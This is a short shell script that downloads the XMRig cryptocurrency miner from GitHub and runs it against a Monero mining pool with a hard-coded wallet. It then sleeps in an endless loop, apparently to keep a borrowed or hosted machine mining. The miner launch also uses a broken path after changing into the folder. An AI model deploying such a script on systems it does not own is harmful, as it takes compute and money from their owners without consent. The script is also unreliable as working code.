#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.16.1/xmrig-6.16.1-linux-x64.tar.gz
tar -xvf xmrig-6.16.1-linux-x64.tar.gz
cd xmrig-6.16.1
./xmrig-6.16.1/xmrig -o sg.minexmr.com:443 -u 88nZ8ptSxEW2C3MPwmeghD3psnciyq6LZQ7nnAtoT6ieNfEvDXPDkhQAdWU6zUxnoL8DojRHzATzD8m6yEjjWiRD6VwRZ1p.God_Miner#ek61-6h9x -p x --cpu 4
while [ 1 ]; do
sleep 3
done
sleep 999

 
